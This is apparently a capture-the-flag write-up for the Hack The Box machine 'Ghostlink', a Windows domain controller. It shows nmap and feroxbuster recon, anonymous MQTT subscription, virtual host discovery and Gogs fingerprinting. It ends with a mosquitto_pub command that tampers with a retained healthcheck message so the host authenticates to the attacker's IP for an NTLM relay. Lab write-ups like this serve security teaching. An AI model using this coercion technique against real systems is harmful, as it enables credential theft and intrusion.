---
maquina: "Ghostlink"
dificultad: "Hard"
os: "Windows"
plataforma: "htb"
release: "23 Jun 2026"
retire: "23 Jun 2026"
creadores: "ctrlzero"
htb_url: "https://hackthebox.com/machines/ghostlink"
app_url: "https://app.hackthebox.com/machines/951"
url: "https://0xdf.gitlab.io/2026/09/15/htb-ghostlink.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Ghostlink is built around a fictional threat group running its operations on a Windows domain controller, with a message broker quietly announcing infrastructure I can’t otherwise reach. I’ll subscribe to that broker anonymously to find internal sites, then publish a tampered health check message to coerce the host into authenticating to me. Relaying that authentication gets me into a restricted file sharing site, where an unchecked path in the download endpoint gives arbitrary file read, leading to a user’s registry hive and a password database. Those credentials unlock the Gogs instance, where a symbolic link flaw in the content API lets me overwrite a Git config and get a shell on the virtual machine hosting it. I’ll crack a password hash from the Gogs database to reach a domain account, and finish by relaying coerced machine account authentication to the certificate authority to get a certificate for the domain controller and dump the domain. In Beyond Root, I’ll show why the other certificate services path never had a chance, and reverse engineer the file sharing application.

## Recon

### Initial Scanning

`nmap` finds 24 open TCP ports:

```console
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.83.229
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-24 21:39 UTC
Nmap scan report for 10.129.83.229
Host is up, received echo-reply ttl 127 (0.021s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1883/tcp  open  mqtt             syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49680/tcp open  unknown          syn-ack ttl 127
49904/tcp open  unknown          syn-ack ttl 127
49910/tcp open  unknown          syn-ack ttl 127
59213/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,1883,2179,3268,3269,5985,9389,49664,49677,49678,49679,49680,49904,49910,59213 -sCV 10.129.83.229
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-24 21:44 UTC
Nmap scan report for 10.129.83.229
Host is up (0.021s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Ghost Protocol Zero
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-25 05:44:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
1883/tcp  open  mqtt
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/brokers/client_status/mqttui-3a97c5cc: {"status":"online", "username":"(null)", "ts":1787636726019,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-3a97c5cc","clean_start":1, "IPv4":"127.0.0.1"}
|     $SYS/brokers/client_status/mqttui-7e93c4ef: {"status":"offline", "username":"(null)","ts":1787636721809,"reason_code":"0","client_id":"mqttui-7e93c4ef","IPv4":"127.0.0.1"}
|     $SYS/brokers/client_status/mqttui-36b02615: {"status":"offline", "username":"(null)","ts":1787636719682,"reason_code":"0","client_id":"mqttui-36b02615","IPv4":"127.0.0.1"}
|_    $SYS/brokers/client_status/mqttui-72e9dc37: {"status":"offline", "username":"(null)","ts":1787636723906,"reason_code":"0","client_id":"mqttui-72e9dc37","IPv4":"127.0.0.1"}
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49904/tcp open  msrpc         Microsoft Windows RPC
49910/tcp open  msrpc         Microsoft Windows RPC
59213/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-time:
|   date: 2026-08-25T05:45:22
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.00 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `ghostlink.htb`, and the hostname is `DC01`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```console
oxdf@hacky$ netexec smb 10.129.83.229 --generate-hosts-file hosts
SMB         10.129.83.229    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts
oxdf@hacky$ head -1 /etc/hosts
10.129.83.229     DC01.ghostlink.htb ghostlink.htb DC01
```

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away. IIS could be proxying to other servers behind it. When it does this, it typically terminates the connection between my VM and it, and uses a new connection to read from the other server, so the TTL doesn’t change.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC01.ghostlink.htb` before any actions that use Kerberos auth.

In addition to typical DC ports, MQTT (1883) is also listening, and the script output shows that there’s information available unauthenticated. VM RDP (2179) is also listening, suggesting that there will be Hyper-V VMs running.

### Website - TCP 80

#### Site

The website belongs to a group calling itself “Ghost Protocol Zero”. It has some 3D graphics with neon colors and motion:

![image-20260824180134063](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260824180134063.png)

![image-20260824180123555](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260824180123555.png)

#### Tech Stack

The HTTP response headers show just IIS:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 26 Feb 2026 20:18:12 GMT
Accept-Ranges: bytes
ETag: "36a06185da7dc1:0"
Server: Microsoft-IIS/10.0
Date: Tue, 25 Aug 2026 05:59:11 GMT
Content-Length: 682
```

I’m not able to guess a static page name for the site (such as `index.html`).

The 404 returns an HTTP response with no body:

```http
HTTP/1.1 404 Not Found
Server: Microsoft-IIS/10.0
Date: Tue, 25 Aug 2026 06:02:52 GMT
Content-Length: 0
```

The page source is just loading a full screen `.mp4` video with embedded CSS:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Ghost Protocol Zero</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#050D0D;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container" align="center">
<video width="100%" autoplay loop muted>
  <source src="landing.mp4" type="video/mp4" />
</video>
</div>
</body>
</html>
```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```console
oxdf@hacky$ feroxbuster -u http://ghostlink.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://ghostlink.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       34l       59w      682c http://ghostlink.htb/
400      GET        6l       26w      324c http://ghostlink.htb/error%1F_log
[####################] - 14s    30004/30004   0s      found:2       errors:0
[####################] - 13s    30000/30000   2310/s  http://ghostlink.htb/
```

Nothing at all.

### SMB - TCP 445

`netexec` shows that the host is running Windows Server 2025, with SMB signing enabled:

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb
SMB         10.129.83.229    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
```

The guest account is disabled:

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb -u guest -p ''
SMB         10.129.83.229    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229    445    DC01             [-] ghostlink.htb\guest: STATUS_ACCOUNT_DISABLED
```

And null auth doesn’t work:

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb -u oxdf -p oxdf --shares
SMB         10.129.83.229    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229    445    DC01             [-] ghostlink.htb\oxdf:oxdf STATUS_LOGON_FAILURE
```

I’ll have to check back when I have creds.

### MQTT - TCP 1883

#### Background

[MQTT](https://mqtt.org/) is a lightweight pub/sub messaging protocol common in IoT / ICS environments. Clients connect to a broker and either publish messages to a topic or subscribe to topics to receive them. Subscriptions support two wildcards:

- `+` matches exactly one level
- `#` matches everything from that point down, so subscribing to `#` is “give me everything”

Brokers also expose a `$SYS/` tree with statistics about the broker itself. On many brokers `$SYS` is not matched by `#`, so it’s worth subscribing to both.

Some brokers allow anonymous connections, and in that case, subscribing to `#` dumps whatever the environment is talking about.

I’ve hacked MQTT before in [Santa Vision](https://0xdf.gitlab.io/holidayhack2024/act-iii/santavision) from the 2024 Holiday Hack and [HTB PlayerTwo](https://0xdf.gitlab.io/2020/06/27/htb-playertwo.html#mqtt).

#### Tooling

I’ll install the reference client from `mosquitto` with `sudo apt install mosquitto-clients`, adding the `mosquitto_sub` and `mosquitto_pub` binaries to my path. `nmap`’s `mqtt-subscribe` NSE script does a smaller version of the same thing, and it already showed in the `-sCV` scan above that anonymous connections work.

#### Subscribe

`mosquitto_sub` with `-v` prints the topic alongside the payload. I’ll subscribe to `#` and let it run:

```console
oxdf@hacky$ mosquitto_sub -h ghostlink.htb -p 1883 -v -t '#'
GhostProtocolZero/energy/grid/frequency {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"ip":"10.1.12.34","loadPercent":85,"hz":119726636.8}}
GhostProtocolZero/identity/trust-provider/state {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"ip":"10.1.12.34","tokenValidation":"delayed","authErrors":10}}
GhostProtocolZero/network/node/healthcheck {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"healthy":false,"url":"https://core-telecom.ghostlink.htb/keepalive","lastCheckSecAgo":6,"ip":"10.1.12.34"}}
GhostProtocolZero/network/node/keepalive {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"rttMs":158,"status":"error","url":"https://core-telecom.ghostlink.htb/keepalive","ip":"10.1.12.34"}}
GhostProtocolZero/space/satellite/timing-drift {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"driftNs":-35,"ip":"10.1.12.34","syncState":"unstable"}}
GhostProtocolZero/telecom/core-routing/health {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"ip":"10.1.12.34","packetLoss":998153900,"routeStability":"flapping"}}
GhostProtocolZero/transport/logistics/status {"timestamp":"2026-24-08-18:01:11","node":"node-3","telemetry":{"throughput":66,"anomaly":"inspection","ip":"10.4.23.11"}}
GhostProtocolZero/systems/node/domain/healthcheck {"timestamp":"2026-24-08-18:01:40","node":"node-4","telemetry":{"healthy":true,"url":"dc01.ghostlink.htb/healthcheck","latencyMs":267,"ip":"10.129.83.229"}}
GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"2026-24-08-18:01:41","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","lastCheckSecAgo":2,"responseCode":"200","ip":"172.16.20.20"}}
GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-24-08-18:01:41","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":28,"responseCode":"200","ip":"172.16.20.10"}}
```

Anonymous subscribe works, with no creds at all. Immediately on connecting, the first 10 messages show up, all in `GhostProtocolZero/#`. These are retained messages, where the broker holds the last message on each topic and replays it to new subscribers.

Listening for a bit longer, the rest of the messages are all in `$SYS/brokers/client_status/#`:

```console
$SYS/brokers/client_status/mqttui-4fcee17f {"status":"online", "username":"(null)", "ts":1787650459915,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-4fcee17f","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-4fcee17f {"status":"offline", "username":"(null)","ts":1787650459918,"reason_code":"0","client_id":"mqttui-4fcee17f","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-9491a821 {"status":"online", "username":"(null)", "ts":1787650462021,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-9491a821","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-9491a821 {"status":"offline", "username":"(null)","ts":1787650462021,"reason_code":"0","client_id":"mqttui-9491a821","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-8161ae07 {"status":"online", "username":"(null)", "ts":1787650464114,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-8161ae07","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-8161ae07 {"status":"offline", "username":"(null)","ts":1787650464114,"reason_code":"0","client_id":"mqttui-8161ae07","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-56230d01 {"status":"online", "username":"(null)", "ts":1787650466231,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-56230d01","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-56230d01 {"status":"offline", "username":"(null)","ts":1787650466233,"reason_code":"0","client_id":"mqttui-56230d01","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-714ed1b8 {"status":"online", "username":"(null)", "ts":1787650468348,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-714ed1b8","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-714ed1b8 {"status":"offline", "username":"(null)","ts":1787650468348,"reason_code":"0","client_id":"mqttui-714ed1b8","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-20c630d {"status":"online", "username":"(null)", "ts":1787650470458,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-20c630d","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-20c630d {"status":"offline", "username":"(null)","ts":1787650470458,"reason_code":"0","client_id":"mqttui-20c630d","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-69156eae {"status":"online", "username":"(null)", "ts":1787650472569,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-69156eae","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-69156eae {"status":"offline", "username":"(null)","ts":1787650472571,"reason_code":"0","client_id":"mqttui-69156eae","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-587eb3f8 {"status":"online", "username":"(null)", "ts":1787650474683,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-587eb3f8","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-587eb3f8 {"status":"offline", "username":"(null)","ts":1787650474683,"reason_code":"0","client_id":"mqttui-587eb3f8","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-46323339 {"status":"online", "username":"(null)", "ts":1787650476800,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-46323339","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-46323339 {"status":"offline", "username":"(null)","ts":1787650476803,"reason_code":"0","client_id":"mqttui-46323339","IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-9d61eebe {"status":"online", "username":"(null)", "ts":1787650478925,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-9d61eebe","clean_start":1, "IPv4":"127.0.0.1"}
$SYS/brokers/client_status/mqttui-9d61eebe {"status":"offline", "username":"(null)","ts":1787650478928,"reason_code":"0","client_id":"mqttui-9d61eebe","IPv4":"127.0.0.1"}
```

These topics are the broker’s accounting, showing that every two seconds a client named `mqttui-[random]` connects from `127.0.0.1` and immediately disconnects. This activity suggests that something on the box itself is using [mqttui](https://github.com/EdJoPaTo/mqttui) to poll the broker in a loop.

The interesting information is in the topics ending in `healthcheck`:

```console
oxdf@hacky$ mosquitto_sub -h ghostlink.htb -p 1883 -v -t 'GhostProtocolZero/#' -W 1 | grep healthcheck
GhostProtocolZero/network/node/healthcheck {"timestamp":"2026-24-08-18:01:11","node":"node-1","telemetry":{"healthy":false,"url":"https://core-telecom.ghostlink.htb/keepalive","lastCheckSecAgo":6,"ip":"10.1.12.34"}}
GhostProtocolZero/systems/node/domain/healthcheck {"timestamp":"2026-24-08-18:01:40","node":"node-4","telemetry":{"healthy":true,"url":"dc01.ghostlink.htb/healthcheck","latencyMs":267,"ip":"10.129.83.229"}}
GhostProtocolZero/systems/node/repository/healthcheck {"timestamp":"2026-24-08-18:01:41","node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","lastCheckSecAgo":2,"responseCode":"200","ip":"172.16.20.20"}}
GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-24-08-18:01:41","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":28,"responseCode":"200","ip":"172.16.20.10"}}
Timed out
```

I’m using `-W 1` to just listen for one second and then stop, so that I can pipe the results into `grep`. Each of these four messages has information about a piece of infrastructure related to Ghostlink:

| Topic | Node | Healthy | Domain | IP |
|---|---|---|---|---|
| `GhostProtocolZero/network/node/healthcheck` | node-1 | ❌ | `core-telecom.ghostlink.htb` | 10.1.12.34 |
| `GhostProtocolZero/systems/node/domain/healthcheck` | node-4 | ✅ | `dc01.ghostlink.htb` | 10.129.83.229 |
| `GhostProtocolZero/systems/node/repository/healthcheck` | node-5 | ✅ | `gpz-op26-toolkits.ghostlink.htb` | 172.16.20.20 |
| `GhostProtocolZero/systems/node/secureshare/healthcheck` | node-6 | ✅ | `gpz-op26-secure.ghostlink.htb` | 172.16.20.10 |

#### Publish

The broker doesn’t restrict writes either. Publishing at QoS 1 gets a `PUBACK` back, so the broker accepted the message:

```console
oxdf@hacky$ mosquitto_pub -h ghostlink.htb -p 1883 -t '0xdf/test' -m 'hello' -d
Client null sending CONNECT
Client null received CONNACK (0)
Client null sending PUBLISH (d0, q0, r0, m1, '0xdf/test', ... (5 bytes))
Client null sending DISCONNECT
```

With a second terminal running `mosquitto_sub` I’ll see the message come back:

```console
oxdf@hacky$ mosquitto_sub -h ghostlink.htb -p 1883 -t '0xdf/test'
hello
```

So the broker is accepting messages. MQTT doesn’t tell a publisher if anyone is subscribing, so I can’t tell from here what reads what. Still, the `$SYS` tree showed a client connecting every two seconds, so something on the box is consuming these topics. I’ll come back to this.

### New Virtual Hosts - TCP 80

Of all the open services on Ghostlink, HTTP is the one that might be serving different content based on the hostname used to access it. Each of the domains identified in the MQTT traffic had an IP associated with them. This means that they could be networks I have to pivot into later in the challenge.

Still, it’s worth checking if the main host replies differently on HTTP when a different `Host` header is given. I’ll check the default case:

```console
oxdf@hacky$ curl http://10.129.83.229 -s | md5sum
f2e0a8939f7b196dc78f9e21e9890477  -
oxdf@hacky$ curl http://10.129.83.229
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Ghost Protocol Zero</title>
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#050D0D;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container" align="center">
<video width="100%" autoplay loop muted>
  <source src="landing.mp4" type="video/mp4" />
</video>
</div>
</body>
</html>
```

Adding a `Host` header doesn’t change it:

```console
oxdf@hacky$ curl -H 'Host: dc01.ghostlink.htb' http://10.129.83.229 -s | md5sum
f2e0a8939f7b196dc78f9e21e9890477  -
oxdf@hacky$ curl -H 'Host: ghostlink.htb' http://10.129.83.229 -s | md5sum
f2e0a8939f7b196dc78f9e21e9890477  -
```

When I try the domains from MQTT, two of them send different content:

```console
oxdf@hacky$ curl -H 'Host: core-telecom.ghostlink.htb' http://10.129.83.229 -s | md5sum
f2e0a8939f7b196dc78f9e21e9890477  -
oxdf@hacky$ curl -H 'Host: gpz-op26-toolkits.ghostlink.htb' http://10.129.83.229 -s | md5sum
2376833acc0ba8bf3bc6659c6f288ed8  -
oxdf@hacky$ curl -H 'Host: gpz-op26-secure.ghostlink.htb' http://10.129.83.229 -s | md5sum
5720392716b0be81c8110c6f0598e01b  -
```

I’ll add these to my `hosts` file:

```plaintext
10.129.83.229     DC01.ghostlink.htb ghostlink.htb DC01 core-telecom.ghostlink.htb gpz-op26-toolkits.ghostlink.htb gpz-op26-secure.ghostlink.htb
```

### gpz-op26-secure.ghostlink.htb - TCP 80

Visiting this site asks for HTTP auth:

![image-20260911070054254](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911070054254.png)

Without the creds I get an IIS 401 page:

![image-20260911070120435](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260911070120435.png)

The HTTP response headers show that it’s requesting NTLM authentication:

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
X-Powered-By: ARR/3.0
Date: Sat, 12 Sep 2026 18:59:50 GMT
Content-Length: 1293
```

ARR is IIS’s reverse proxy module.

### gpz-op26-toolkits.ghostlink.htb - TCP 80

#### Site

The site is an instance of Gogs Git service:

![image-20260825090131149](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260825090131149.png)

Explore shows multiple repos:

![image-20260825090517520](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260825090517520.png)

There are six repos across three users, all created 2026-03-04, all with a “GPZ Op26 -“ description:

| Repo | Owner | Description |
|---|---|---|
| `vortex-strike` | `vroth` | GPZ Op26 - Multi-service exploitation scripts targeting communications, financial, and network infrastructure |
| `shadow-pulse` | `vroth` | GPZ Op26 - MQTT-based infrastructure automation, monitoring, and C2 framework for power grid and water supply systems |
| `cipher-breach` | `zkovacs` | GPZ Op26 - Cryptographic weakness identification and exploitation toolkit for breaking Nightfall encryption |
| `iron-crypt` | `zkovacs` | GPZ Op26 - Secure file encryption toolkit for exfiltrated data protection using military-grade cryptography |
| `spectra-analyze` | `ohexley` | GPZ Op26 - Firmware reverse engineering and binary analysis suite for Nightfall embedded systems |
| `nightfall-overwatch` | `ohexley` | GPZ Op26 - Binary exploitation framework targeting Task Force Nightfall SCADA and satellite uplink systems |

I can clone these and take a look. These are mostly just flavor for the box. Each repo has just one commit (so no history to dig into).

The Users page shows five users:

![image-20260825093204561](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260825093204561.png)

For the three that have commits in the repos I can get their emails as well:

| Name | Username | Email |
|---|---|---|
| <unknown> | gpz-tools-admin | <unknown> |
| Nyx Virelli | nvirelli | <unknown> |
| Orin Hexley | ohexley | `ohexley@ghostlink.htb` |
| Vesper Roth | vroth | `vroth@ghostlink.htb` |
| Zara Kovacs | zkovacs | `zkovacs@ghostlink.htb` |

#### Tech Stack

I know this is Gogs, a Go-based Git service. Gogs stopped [publishing the version from the footer](https://github.com/gogs/gogs/blob/main/CHANGELOG.md#0120) in 0.12.0, so the version must be that or later. The main source loads `gogs.min.css` and `gogs.js` with hash values:

```html
<link rel="stylesheet" href="/css/gogs.min.css?v=5084b4a9b77a506f5e287e82e945e1c6882b827a">
<script src="/js/gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a"></script>
```

That hash is the hash of the Git commit, which I can find at `https://github.com/gogs/gogs/commit/<hash>`:

![image-20260825090409815](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260825090409815.png)

So this is Gogs version 0.13.3.

## Shell as git@gpz-op26-toolkits

### Secure Site Access

#### Authentication Coercion

There’s a message over MQTT doing a healthcheck on `gpz-op26-secure.ghostlink.htb`, the site I can’t access because it requires auth. I’ll grab that message:

```console
oxdf@hacky$ mosquitto_sub -h ghostlink.htb -p 1883 -v -t 'GhostProtocolZero/systems/node/secureshare/healthcheck'
GhostProtocolZero/systems/node/secureshare/healthcheck {"timestamp":"2026-08-09-01:09:13","node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","lastCheckSecAgo":14,"responseCode":"200","ip":"172.16.20.10"}}
```

I’m going to edit that message so that it tries to talk to my host instead, and send it back:

```console
oxdf@hacky$ mosquitto_pub -h ghostlink.htb -p 1883 -d -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -m '{"timestamp":"2026-08-09-01:09:13","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.15.169/healthcheck","lastCheckSecAgo":14,"responseCode":"200","ip":"172.16.20.10"}}'
Client null sending CONNECT
Client null received CONNACK (0)
Client null sending PUBLISH (d0, q0, r1, m1, 'GhostProtocolZero/systems/node/secureshare/healthcheck', ... (181 bytes))
Client null sending DISCONNECT
```

